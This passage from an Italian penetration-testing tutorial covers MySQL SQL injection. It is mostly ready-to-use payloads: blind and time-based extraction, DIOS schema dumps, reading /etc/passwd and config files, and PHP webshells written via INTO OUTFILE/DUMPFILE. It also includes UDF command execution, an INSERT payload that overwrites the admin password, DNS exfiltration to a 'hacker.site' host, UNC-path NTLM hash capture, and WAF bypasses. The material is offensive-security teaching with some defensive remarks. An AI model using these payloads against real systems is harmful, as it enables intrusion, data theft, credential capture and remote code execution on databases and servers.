SELECT ORD(SUBSTR(nome,1,1)) FROM utenti
```

Se stai estraendo dati che potrebbero contenere caratteri accentati o non ASCII (nomi, email con domini internazionalizzati), usa `ORD()` invece di `ASCII()` per non leggere un byte a metà di un carattere multibyte.

### LENGTH() vs CHAR\_LENGTH()

`LENGTH()` conta i **byte**, `CHAR_LENGTH()` conta i **caratteri**. Con charset come UTF-8, dove un carattere può occupare più byte, le due funzioni danno risultati diversi sulla stessa stringa. Per sapere quante "richieste di bisezione" ti servono per un campo, usa sempre `CHAR_LENGTH()`; `LENGTH()` ti serve invece se stai ricostruendo dati byte per byte (es. binari via `HEX()`).

### Gestire i valori NULL durante l'estrazione

```sql
' AND (SELECT IFNULL(email,'NULL_VALUE') FROM users LIMIT 1) LIKE 'a%'-- -
```

Se un campo può essere `NULL`, confrontarlo o concatenarlo con `IFNULL()`/`COALESCE()` prima evita risultati ambigui: `NULL` propagato in un confronto o in una `CONCAT()` rende tutta l'espressione `NULL`, e una condizione che valuta `NULL` non è né vera né falsa — in un blind, questo può sembrare un "falso" quando in realtà il dato è semplicemente assente.

### Un walkthrough completo per bisezione

Metti insieme tutto quanto visto sopra in una sequenza riproducibile:

1. **Lunghezza**: `' AND CHAR_LENGTH((SELECT password FROM users LIMIT 1))>N-- -`, aumenta `N` finché la condizione diventa falsa (o dimezza l'intervallo).
2. **Carattere per bisezione — dato ASCII (il caso più comune: password, username, hash):** `' AND ASCII(SUBSTR((SELECT password FROM users LIMIT 1),POS,1))>128-- -`, poi dimezza l'intervallo (`>64`, `>192`, ecc.) finché non resta un solo valore tra 0 e 255 — circa 7-8 richieste per carattere, perché il dominio è noto e fisso (un byte).
   2bis. **Carattere per bisezione — dato multibyte (nomi con accenti, testo non latino):** qui usa `ORD()` invece di `ASCII()`, ma il dominio **non è più 0-255**: un carattere Unicode può arrivare a valori ben più alti (i caratteri CJK, per esempio, superano abbondantemente le migliaia). Parti con un intervallo più ampio (es. `>0` e `<65536`) e dimezza da lì: ti servirà qualche richiesta in più rispetto al caso ASCII, non le stesse 7-8.
3. **Passa alla posizione successiva** (`POS+1`) e ripeti finché non hai `CHAR_LENGTH` caratteri.
4. **Se il dato è binario** (es. un hash salvato come `BLOB`), usa `HEX()` sull'intero valore invece di estrarlo carattere per carattere con `SUBSTR`/`ORD`: è più lento ma garantisce di non perdere byte non stampabili.

Separa sempre i campi con un delimitatore fisso (`CONCAT(col1,'|',col2)`) quando estrai più colonne in una volta, così non confondi dove finisce un valore e dove inizia il successivo.

## Time Based

Se la pagina è sempre identica, resta il tempo: fai "dormire" il database **solo se** la tua condizione è vera, e misuri quanto ci mette a rispondere.

**MySQL 4/5 con BENCHMARK():** non c'è una pausa vera, ma si fa fare al server un calcolo pesante e ripetuto (usato quando `SLEEP` non esiste o è filtrato).

```sql
+BENCHMARK(40000000,SHA1(1337))+
'+BENCHMARK(3200,SHA1(1))+'
AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
```

**MySQL 5 con SLEEP():** la pausa vera, in secondi.

```sql
RLIKE SLEEP([SLEEPTIME])
OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR
AND SLEEP(10)=0
AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)
```

`[SLEEPTIME]` è il numero di secondi, `[RANDNUM]` e `[RANDSTR]` sono valori casuali che inventi tu (servono a evitare la cache). Il primo test da fare è sempre `AND SLEEP(5)`: se la pagina ci mette 5 secondi in più, hai la conferma.

### SLEEP dentro una subselect

Qui si combina `SLEEP` con `LIKE` per estrarre un dato carattere per carattere, senza `SUBSTR`. Il database dorme solo se il modello combacia.

**Lunghezza del dato** (ogni `_` è un carattere; se dorme con 5 underscore, il nome è lungo 5):

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '%')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '___')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '____')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '_____')#
```

**Primo carattere:**

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'A____')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'S____')#
```

**Secondo carattere:**

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SA___')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SW___')#
```

**Terzo carattere:**

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWA__')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWB__')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWI__')#
```

**Cercare una colonna** che contiene "pass" nel nome:

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema=DATABASE() AND column_name LIKE '%pass%' LIMIT 0,1) LIKE '%')#
```

`FROM DUAL` è una tabella finta di MySQL: serve solo per poter scrivere una `SELECT` con `WHERE` senza una tabella vera.

### Time based con condizioni

```sql
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1))>=100, 1, SLEEP(3)) --
?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
```

**Occhio all'inversione:** le prime due righe fanno dormire il database quando la condizione è **falsa** (`IF(cond, 1, SLEEP(3))`). La terza lo fa dormire quando è **vera**. Quando automatizzi uno script, sapere in quale dei due casi aspetti il ritardo è fondamentale.

Con la risposta lenta rischi falsi positivi se la rete è instabile: ripeti sempre il test e usa un ritardo abbastanza grande da distinguerlo dal rumore. Per automatizzare tutto c'è [sqlmap](https://hackita.it/articoli/sqlmap/).

***

## DIOS: Dump In One Shot

DIOS significa "scarica tutto in un colpo solo". Invece di estrarre database, tabelle e colonne una richiesta alla volta, costruisci **una sola injection** che mette tutto in un'unica stringa gigante e te la restituisce.

Il trucco è una **variabile utente** (`@`): a ogni riga letta da `information_schema` il database aggiunge un pezzo alla variabile con `concat(@, ...)`. Alla fine la variabile contiene l'intera mappa e la stampi.

```sql
(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#
(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#
```

La prima riga elenca **tutte le colonne di tutti i database** nel formato `[ database ] > tabella > colonna`. La seconda, con `db_data.table_data`, `column_data1` e `column_data2` da sostituire, scarica il **contenuto** di una tabella.

Le varianti storiche di vari autori, tutte con la stessa idea:

**SecurityIdiots**

```sql
make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
```

**Profexer**

```sql
(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)
```

**Dr.Z3r0**

```sql
(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))
```

**M\@dBl00d**

```sql
(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
```

**Zen**

```sql
+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
```

**sharik**

```sql
(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)
```

Gli esadecimali sono solo separatori e filtri: `0x3c6c693e` è `<li>`, `0x3C62723E` è `<br>`, `0x0a` è un a-capo, `0x203a3a20` è `::`. Nella variante *sharik* `0x696e666f726d6174696f6e5f736368656d61` è la parola `information_schema`, usata per **escluderla** dal risultato e non sporcare l'output.

Quando serve: solo con output visibile (UNION o error-based), mai nel blind. Su MySQL 8 le assegnazioni di variabili dentro le espressioni sono deprecate e possono comportarsi in modo diverso: se il DIOS non funziona, ripiega su `GROUP_CONCAT` o `json_arrayagg`.

***

## Query in esecuzione: PROCESSLIST

`INFORMATION_SCHEMA.PROCESSLIST` è una tabella speciale (MySQL e MariaDB) che elenca cosa sta facendo il server **in questo momento**: chi è connesso, da dove e quale query sta eseguendo.

Colonne principali:

| Colonna   | Significato                        |
| --------- | ---------------------------------- |
| `ID`      | Identificativo del processo        |
| `USER`    | Utente MySQL che lo esegue         |
| `HOST`    | Da dove si è connesso              |
| `DB`      | Database in uso                    |
| `COMMAND` | Tipo di comando (Query, Sleep...)  |
| `TIME`    | Da quanti secondi è in corso       |
| `STATE`   | Stato corrente                     |
| `INFO`    | Il testo della query in esecuzione |

```sql
SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;
```

| ID | USER       | HOST             | DB     | COMMAND | TIME | STATE      | INFO                       |
| -- | ---------- | ---------------- | ------ | ------- | ---- | ---------- | -------------------------- |
| 1  | root       | localhost        | testdb | Query   | 10   | executing  | SELECT \* FROM some\_table |
| 2  | app\_uset  | 192.168.0.101    | appdb  | Sleep   | 300  | sleeping   | NULL                       |
| 3  | gues\_user | example.com:3360 | NULL   | Connect | 0    | connecting | NULL                       |

Via UNION:

```sql
UNION SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #
```

E la versione DIOS per scaricare tutto il contenuto della tabella:

```sql
UNION SELECT 1,(SELECT(@)FROM(SELECT(@:=0X00),(SELECT(@)FROM(information_schema.processlist)WHERE(@)IN(@:=CONCAT(@,0x3C62723E,state,0x3a,info))))a),3,4 #
```

**Perché è interessante:** la colonna `INFO` mostra le query **degli altri utenti**, e dentro quelle query possono esserci dati sensibili (password, token, email) che l'applicazione sta passando in quel momento. Per vedere i processi di altri utenti servono i privilegi adeguati; senza, vedi solo i tuoi. Su MySQL 8 questa tabella è deprecata a favore di `performance_schema.processlist`, ma si trova ancora su molti sistemi.

***

## Leggere file dal server

Con `LOAD_FILE()` il database legge un file dal disco del server e te lo restituisce come testo. Servono tre cose: il privilegio `FILE`, il percorso assoluto del file, e che l'utente con cui gira MySQL possa leggerlo.

```sql
UNION ALL SELECT LOAD_FILE('/etc/passwd') --
UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));
```

La seconda riga codifica il file in base64: serve per leggere file con caratteri strani (come il codice PHP, che altrimenti verrebbe interpretato o rotto dalla pagina). Poi lo decodifichi in locale.

Se fallisce, probabilmente vedi questo errore:

```
ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
```

`secure_file_priv` limita le cartelle in cui MySQL può leggere e scrivere file. Controlla il suo valore con `SELECT @@secure_file_priv`: se è vuoto non c'è nessun limite, se contiene un percorso sei confinato lì, se è `NULL` la funzione è disabilitata.

Se sei **root** sul database e il privilegio `FILE` manca, puoi riattivarlo:

```sql
GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
```

Questo però non aggira `secure_file_priv`: quello si imposta all'avvio del server.

Cosa leggere in un test: file di configurazione con credenziali (`wp-config.php`, `.env`, `config.php`), il codice dell'app per trovare altre vulnerabilità, `/etc/passwd` come prova di lettura. Se il tuo vero scopo è leggere file, vale la pena conoscere anche [Path Traversal](https://hackita.it/articoli/path-traversal/).

### LOAD DATA LOCAL INFILE: un caso diverso da LOAD\_FILE()

`LOAD_FILE()` legge un file **lato server**, con i privilegi del database. `LOAD DATA LOCAL INFILE` è un'altra storia: legge un file **lato client**, cioè dalla macchina che esegue la query — tipicamente il server applicativo, non il database stesso.

```sql
LOAD DATA LOCAL INFILE '/var/www/html/config.php' INTO TABLE tabella_temporanea;
```

Due differenze pratiche importanti rispetto a `LOAD_FILE()`:

* Non dipende dai privilegi `FILE` sul database, ma dal fatto che il **driver/client** (es. la libreria PHP/Python/Java che si connette a MySQL) abbia la modalità `LOCAL` abilitata — su molte librerie moderne è disabilitata di default proprio per il rischio di injection, quindi non è una tecnica che funziona "sempre" come `LOAD_FILE()`.
* Se funziona, legge file dal server **applicativo**, non dal server del database: utile quando i due sono macchine diverse e vuoi leggere file che il database stesso non può vedere.

Per decidere quale tecnica provare, pensa a cosa stai davvero attaccando: `LOAD_FILE()`/`INTO OUTFILE`/`INTO DUMPFILE` agiscono sul filesystem del **server MySQL**, `LOAD DATA LOCAL INFILE` su quello del **client che si connette**, e una UDF (vista sopra) esegue comandi con i privilegi del **processo MySQL**. Stesso obiettivo finale — leggere/scrivere file o eseguire comandi — ma tre superfici diverse, con prerequisiti diversi.

***

## Esecuzione di comandi

Se oltre a leggere puoi **scrivere** file, puoi scrivere uno script nella cartella del sito e richiamarlo dal browser. È il passaggio che trasforma una SQLi in una RCE.

### Webshell con INTO OUTFILE

`INTO OUTFILE` scrive il risultato della query in un file. Tu fai in modo che il "risultato" sia codice PHP e che il file finisca nella cartella web.

```sql
[...] UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'
[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
[...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

Nel test si parte sempre dalla **prova innocua** (`phpinfo()`): se la pagina compare, la scrittura funziona e puoi andare avanti. Nota che la terza riga usa il codice in esadecimale (`0x3c3f70687020...` è `<?php phpinfo(); ?>`): utile quando gli apici sono filtrati.

### Webshell con INTO DUMPFILE

`INTO DUMPFILE` scrive i dati **così come sono**, su una riga sola e senza aggiungere caratteri di escape o a-capo. `OUTFILE` invece li modifica, quindi `DUMPFILE` è la scelta giusta per file binari o script che non devono essere alterati.

```sql
[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';
```

Requisiti per entrambi i metodi: privilegio `FILE`, `secure_file_priv` che lo permetta, una cartella in cui l'utente MySQL possa scrivere, e **il percorso esatto della web root** (lo ricavi da errori, `phpinfo`, file di configurazione o con `@@datadir` come indizio). Inoltre `OUTFILE` non sovrascrive file già esistenti. Una volta ottenuta una shell web, il percorso naturale è [Web Shell](https://hackita.it/articoli/web-shell/) e poi [Command Injection](https://hackita.it/articoli/command-injection/).

### Comandi con una UDF

Una UDF (User Defined Function) è una funzione scritta in C e caricata come libreria dentro MySQL. La più nota, `lib_mysqludf_sys`, aggiunge funzioni per lanciare comandi di sistema. Prima controlli se è già installata:

```
$ whereis lib_mysqludf_sys.so
/usr/lib/lib_mysqludf_sys.so
```

Poi puoi usare `sys_exec` e `sys_eval`:

```
$ mysql -u root -p mysql
Enter password: [...]

mysql> SELECT sys_eval('id');
+--------------------------------------------------+
| sys_eval('id') |
+--------------------------------------------------+
| uid=118(mysql) gid=128(mysql) groups=128(mysql) |
+--------------------------------------------------+
```

Il comando gira con l'utente del servizio MySQL (qui `mysql`), non come root di sistema. Per caricare una UDF servono privilegi alti e una cartella plugin scrivibile (`@@plugin_dir`): è uno scenario più raro del webshell, ma da conoscere. Se arrivi alla shell, l'escalation successiva cambia a seconda del sistema; per Linux c'è [Linux Privilege Escalation](https://hackita.it/articoli/linux-privesc/).

***

## INSERT: cambiare la password dell'admin

Se l'injection è dentro una query `INSERT` (per esempio una registrazione utente) non puoi usare `UNION`, ma puoi sfruttare `ON DUPLICATE KEY UPDATE`: dice a MySQL cosa fare quando provi a inserire una riga che esiste già, ad esempio un'email già registrata.

Payload:

```sql
attacker_dummy@example.com", "P@ssw0rd"), ("admin@example.com", "P@ssw0rd") ON DUPLICATE KEY UPDATE password="P@ssw0rd" --
```

La query finale diventa:

```sql
INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "BCRYPT_HASH"), ("admin@example.com", "P@ssw0rd") ON DUPLICATE KEY UPDATE password="P@ssw0rd" -- ", "BCRYPT_HASH_OF_YOUR_PASSWORD_INPUT");
```

Cosa succede, passo per passo:

1. Inserisce un utente "esca" `attacker_dummy@example.com`.
2. Prova a inserire anche `admin@example.com`, che esiste già.
3. Per via di `ON DUPLICATE KEY UPDATE`, invece di dare errore, MySQL **aggiorna** la password dell'admin con `P@ssw0rd`.
4. Fai login come admin con quella password.

Due attenzioni: se l'app salva password hashate, la password che imposti qui non è un hash e il login potrebbe non funzionare; in quel caso inserisci un hash valido per l'algoritmo usato dall'app. E questo payload **modifica dati reali**: nei test usalo solo in lab.

***

## Truncation: due "admin" diversi che sono lo stesso

In alcune configurazioni MySQL considera `admin` e `admin ` (con spazi dopo) **uguali** nei confronti. Se la colonna ha un limite di caratteri, quello che avanza viene troncato e buttato via.

```sql
`username` varchar(20) not null
```

Payload: `username = "admin               a"` (admin, tanti spazi fino a superare i 20 caratteri, poi una lettera).

Come funziona: al momento della registrazione l'app controlla che `admin<spazi>a` non esista (e infatti non esiste), quindi lo accetta. Poi MySQL lo taglia a 20 caratteri e salva `admin` seguito da spazi, che equivale a `admin`. Ora hai un secondo utente "admin" con la **tua** password.

Attenzione: questo succede solo se MySQL non è in **modalità strict**. Dalla versione 5.7 la modalità strict è attiva di default e produce un errore invece del troncamento silenzioso. È un attacco vecchio, ancora trovabile su installazioni datate o configurate male.

***

## Contesti particolari: ORDER BY, LIMIT, Stacked Queries e Second-Order

Non sempre l'injection finisce in un comodo `WHERE`. Qui `UNION` spesso non funziona e devi cambiare approccio.

### Injection in ORDER BY

Dopo `ORDER BY` non puoi aggiungere `UNION`. Ma puoi far cambiare **l'ordine dei risultati** in base a una condizione e leggere la risposta guardando come sono ordinate le righe.

```sql
?sort=IF(ASCII(SUBSTR(version(),1,1))=53,id,title)
?sort=(SELECT CASE WHEN (1=1) THEN id ELSE title END)
?sort=(SELECT IF(ASCII(SUBSTR(user(),1,1))>=100,SLEEP(3),0))
```

Nella prima, se la condizione è vera la lista è ordinata per `id`, altrimenti per `title`: la differenza ti dà il vero o falso. La seconda è la stessa idea con `CASE`. La terza è la versione time-based. Lato difesa: il nome di una colonna non si può passare come parametro in una prepared statement, quindi va controllato con una **whitelist** di valori ammessi.

### Injection dopo LIMIT

Dopo un `LIMIT` non puoi usare `UNION`. Sulle versioni vecchie esiste `PROCEDURE ANALYSE`:

```sql
1 LIMIT 1,1 PROCEDURE ANALYSE()
1 LIMIT 0,1 PROCEDURE ANALYSE(EXTRACTVALUE(RAND(),CONCAT(0x3a,version())),1)
```

La prima aggiunge alla risposta informazioni sulle colonne (serve che almeno una colonna venga stampata dall'app). La seconda sfrutta un errore per far uscire un dato. Attenzione: è deprecata dalla 5.7 e **rimossa in MySQL 8**. Su MySQL 8 resta il metodo `LIMIT INTO` per contare le colonne, poi le tecniche blind e time-based.

### Stacked queries

Sono più query separate da `;` in un'unica richiesta:

```sql
1; SELECT SLEEP(5)-- -
```

In MySQL funzionano solo se il codice applicativo esegue esplicitamente più statement nella stessa chiamata — per esempio con `mysqli_multi_query()` invece del normale `mysqli_query()` (che ne esegue solo uno), oppure con un driver/libreria configurato per permetterlo esplicitamente (es. il flag `CLIENT_MULTI_STATEMENTS` in alcuni client MySQL). **Attenzione a un errore comune:** usare le "emulated prepares" di PDO (`PDO::ATTR_EMULATE_PREPARES`) non abilita di per sé le query multiple — quell'opzione riguarda come PDO prepara la query lato client, non se il driver sottostante accetta più statement separati da `;` in una singola chiamata. Verifica sempre quale funzione/metodo esegue la query, non solo se le prepared statement sono "emulate". Per questo motivo in MySQL le stacked queries sono molto meno comuni che su Microsoft SQL Server: se ti serve il confronto vedi [SQL Injection MSSQL](https://hackita.it/articoli/sql-injection-mssql/).

### Second-order

Il payload non fa danni quando lo mandi: viene **salvato** e fa danni quando un'altra parte dell'applicazione lo rilegge e lo mette in una query. Esempio: ti registri con username `admin'-- -`. Più tardi la funzione "cambia password" esegue:

```sql
UPDATE users SET password='nuova' WHERE username='admin'-- -'
```

Il commento taglia il resto e la password cambiata è quella dell'**admin**. Per trovarle devi seguire il dato: dove viene inserito, dove viene riletto, e se in quel secondo punto è protetto. Chi si difende sul primo input ma si fida di ciò che c'è già nel database resta vulnerabile.

***

## SQL Injection in UPDATE, DELETE, GROUP BY e HAVING

Finora gli esempi sono quasi tutti su `SELECT`. Ma il parametro vulnerabile può finire dentro un `UPDATE` o un `DELETE` — e qui i vincoli sintattici sono diversi: non puoi usare `UNION` (non c'è un `SELECT` con cui unirlo) e l'impatto cambia completamente, da "leggere dati" a "modificare o cancellare dati".

### Injection nella clausola WHERE di UPDATE/DELETE

```sql
UPDATE profiles SET bio='ciao' WHERE user_id=5 OR 1=1-- -
DELETE FROM sessions WHERE token='abc' OR 1=1-- -
```

Stessa logica del classico `OR 1=1`, ma l'effetto non è "vedere più righe": è **modificare o cancellare tutte le righe della tabella**, non solo quella attesa. Su un'applicazione reale questo può significare cancellare tutte le sessioni attive o sovrascrivere il profilo di ogni utente — molto più distruttivo di una lettura.

### Injection nel valore scritto, non solo nella condizione

```sql
UPDATE users SET email='attacker@evil.com' WHERE id=(SELECT id FROM users WHERE username='admin')-- -
```

Se il parametro vulnerabile è il *valore* che stai scrivendo (non solo la condizione `WHERE`), puoi incorporare una sottoquery anche lì: qui il valore nuovo dell'email dipende da un `SELECT` scelto da te, utile per mirare la modifica a una riga specifica senza conoscerne l'id in anticipo.

### Esfiltrare dati con GROUP BY e HAVING

`GROUP BY`/`HAVING` non supportano `UNION`, ma puoi far comparire un dato nel messaggio d'errore sfruttando lo stesso principio error-based già visto (duplicate-key error):

```sql
' GROUP BY CONCAT((SELECT password FROM users LIMIT 1),FLOOR(RAND(0)*2)) HAVING MIN(0)-- -
```

Questo è il payload classico "RAND() GROUP BY duplicate" per error-based: `FLOOR(RAND(0)*2)` genera una sequenza pseudo-casuale di 0/1 ripetibile, e quando MySQL costruisce una tabella temporanea per il `GROUP BY` può ritrovarsi a calcolare la stessa chiave due volte, generando un errore `Duplicate entry '<password>1' for key <chiave>` che contiene il dato. Funziona solo su alcune versioni/configurazioni di MySQL (il comportamento interno di `GROUP BY` è cambiato nel tempo) — se non ottieni l'errore, torna a `EXTRACTVALUE`/`UPDATEXML`.

### Injection negli identificatori dinamici (nomi di colonna/tabella)

Un caso diverso: a volte non è il valore a essere concatenato, ma il **nome della colonna** usata per ordinare o raggruppare (già visto in `ORDER BY`). MySQL non permette di passare un nome di colonna come parametro in una prepared statement — per questo, lato applicazione, la difesa corretta è una whitelist di nomi ammessi, non l'escaping del valore (lo vedi anche nella sezione difese).

## Out of Band: far uscire i dati dal database

Quando non ottieni nulla né dalla pagina né dai tempi, puoi far **contattare il database verso un server tuo**. Il dato esce dentro la richiesta.

Scrivere su una condivisione di rete:

```sql
SELECT @@version INTO OUTFILE '\\\\192.168.0.100\\temp\\out.txt';
SELECT @@version INTO DUMPFILE '\\\\192.168.0.100\\temp\\out.txt';
```

Ricorda sempre di **raddoppiare i backslash**: dentro una stringa SQL ogni `\` va scritto `\\`, quindi un percorso UNC `\\server\share` diventa `\\\\server\\share`.

### DNS Exfiltration

Metti il dato dentro il nome di un dominio che controlli. Quando il server prova a risolverlo, il tuo server DNS (o un servizio di collaborazione come Burp Collaborator) riceve la richiesta con il dato dentro.

```sql
SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.hacker.site\\a.txt'));
SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,VERSION(),0x2e6861636b65722e736974655c5c612e747874))
```

Il server cerca di leggere `\\5.7.33.hacker.site\a.txt`: per farlo risolve `5.7.33.hacker.site` e tu vedi la versione nei log del tuo DNS. La seconda riga è la stessa cosa con le stringhe in esadecimale. **Importante:** questo funziona solo se il server MySQL gira su **Windows**, perché i percorsi UNC `\\...` sono un concetto Windows, e richiede il privilegio `FILE`. Per saperne di più sul protocollo, vedi [DNS](https://hackita.it/articoli/dns/).

### UNC Path: rubare l'hash NTLM

Un percorso UNC (Universal Naming Convention) ha la forma `\\server\condivisione\file` e in Windows serve ad accedere a risorse di rete. Se fai in modo che il server MySQL provi a raggiungere **una tua** condivisione SMB, Windows prova ad autenticarsi con l'account del servizio e ti consegna il suo hash NetNTLM.

```sql
SELECT LOAD_FILE('\\\\error\\abc');
SELECT LOAD_FILE(0x5c5c5c5c6572726f725c5c616263);
SELECT '' INTO DUMPFILE '\\\\error\\abc';
SELECT '' INTO OUTFILE '\\\\error\\abc';
LOAD DATA INFILE '\\\\error\\abc' INTO TABLE DATABASE.TABLE_NAME;
```

Al posto di `error` metti l'IP o il nome host della tua macchina, dove ascolta un server SMB. Strumenti come [Responder](https://hackita.it/articoli/responder/) catturano l'hash in arrivo. A quel punto puoi provare a craccarlo con [Hashcat](https://hackita.it/articoli/hashcat/) oppure usarlo in un attacco di relay (vedi [NTLM Relay](https://hackita.it/articoli/ntlm-relay/) e [NTLM](https://hackita.it/articoli/ntlm/) per la teoria). Anche qui valgono i requisiti: MySQL su Windows, privilegio `FILE` e `secure_file_priv` che non lo blocchi. In un lab ti basta guardare il traffico in arrivo per avere la prova che il server "esce".

***

## Stored Procedure, SQL dinamico e privilegi DEFINER/INVOKER

Una stored procedure **non è automaticamente sicura**. Se al suo interno costruisce una query concatenando una stringa invece di usare un parametro vincolato, la vulnerabilità esiste comunque — semplicemente si sposta da dentro il codice applicativo a dentro il database.

### SQL dinamico con PREPARE/EXECUTE

```sql
CREATE PROCEDURE cerca_utente(IN nome_utente VARCHAR(50))
BEGIN
  SET @sql = CONCAT('SELECT * FROM users WHERE username = \'', nome_utente, '\'');
  PREPARE stmt FROM @sql;
  EXECUTE stmt;
  DEALLOCATE PREPARE stmt;
END;
```

Questa procedura **sembra** usare `PREPARE`/`EXECUTE` (spesso associati, a torto, a "sicuro di default"), ma la query viene costruita concatenando `nome_utente` dentro una stringa *prima* di prepararla: l'injection avviene nel `CONCAT()`, non nell'esecuzione. Chiamarla con `nome_utente = "x' OR '1'='1"` produce lo stesso risultato di una concatenazione diretta in PHP. `PREPARE`/`EXECUTE` protegge solo se i valori utente arrivano come **parametri della query preparata** (`EXECUTE stmt USING @valore`), non se finiscono dentro la stringa SQL costruita a mano.

### SQL SECURITY DEFINER vs INVOKER

```sql
CREATE PROCEDURE p()
SQL SECURITY DEFINER
BEGIN
  SELECT * FROM tabella_riservata;
END;

CREATE PROCEDURE p()
SQL SECURITY INVOKER
BEGIN
  SELECT * FROM tabella_riservata;
END;
```

In MySQL la clausola `SQL SECURITY` va tra la firma della procedura e il corpo racchiuso in `BEGIN ... END` — non esiste una forma abbreviata con `AS`. Questa clausola decide **con quali privilegi gira la procedura**: `DEFINER` (il default) la esegue con i privilegi di chi l'ha creata, `INVOKER` con i privilegi di chi la chiama. Una procedura `DEFINER` creata da un utente con privilegi elevati e vulnerabile a injection diventa un modo per **eseguire query con privilegi più alti dei tuoi** — un'escalation di privilegi via injection, non solo un furto di dati. Verifica sempre il `DEFINER` di una stored procedure sospetta:

```sql
SELECT DEFINER FROM information_schema.routines WHERE routine_name='cerca_utente';
```

## Bypass del WAF

Un WAF (Web Application Firewall) blocca le parole sospette (`UNION`, `SELECT`, `information_schema`...). Le tecniche sotto servono a scrivere la stessa cosa in un modo che il filtro non riconosce ma MySQL capisce. Nessuna è magica: i WAF moderni conoscono molti di questi trucchi, quindi provale come idee da combinare, non come ricette garantite.

### Alternative a information\_schema

Se `information_schema.tables` è filtrato, MySQL ha altre tabelle che contengono gli stessi nomi. Per esempio `mysql.innodb_table_stats`:

```
SELECT * FROM mysql.innodb_table_stats;
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |
| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |
...
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+

mysql> SHOW TABLES IN dvwa;
+----------------+
| Tables_in_dvwa |
+----------------+
| guestbook      |
| users          |
+----------------+
```

Limiti: vede solo le tabelle InnoDB e serve poter leggere il database `mysql`. Per le colonne devi usare i metodi del paragrafo "senza information\_schema".

Se è filtrata solo `information_schema.tables` o `information_schema.columns`, ci sono altre viste dello stesso database che contengono nomi di tabelle:

* `information_schema.partitions`
* `information_schema.statistics`
* `information_schema.key_column_usage`
* `information_schema.table_constraints`

Su MySQL 5.7 e superiori anche le viste del database `sys` espongono nomi di tabelle e schemi.

### Alternative a VERSION

Se la parola `version` è filtrata:

```
mysql> SELECT @@innodb_version;
+------------------+
| @@innodb_version |
+------------------+
| 5.6.31           |
+------------------+

mysql> SELECT @@version;
+-------------------------+
| @@version               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> SELECT version();
+-------------------------+
| version()               |
